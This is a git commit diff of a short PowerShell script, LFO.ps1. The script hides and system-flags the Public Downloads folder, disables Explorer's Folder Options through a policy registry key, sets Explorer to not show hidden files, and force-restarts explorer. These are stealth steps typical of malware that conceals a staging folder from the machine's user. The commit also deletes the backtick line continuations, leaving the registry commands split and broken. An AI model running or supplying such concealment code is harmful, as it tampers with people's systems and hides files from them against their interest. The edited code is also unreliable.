74a4f19f8e9fc31a31557db496b18bff8e413f3c
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-05 10:12:13 +0700

    LFO.ps1

--- LFO.ps1
+++ LFO.ps1
@@ -1,9 +1,9 @@
 attrib +h +s "C:\Users\Public\Downloads"
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
 -Name "NoFolderOptions" -PropertyType DWORD -Value 1 -Force
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 -Name "Hidden" -PropertyType DWORD -Value 2 -Force
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" `
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 -Name "Hidden" -Value 2
 Stop-Process -Name explorer -Force
 
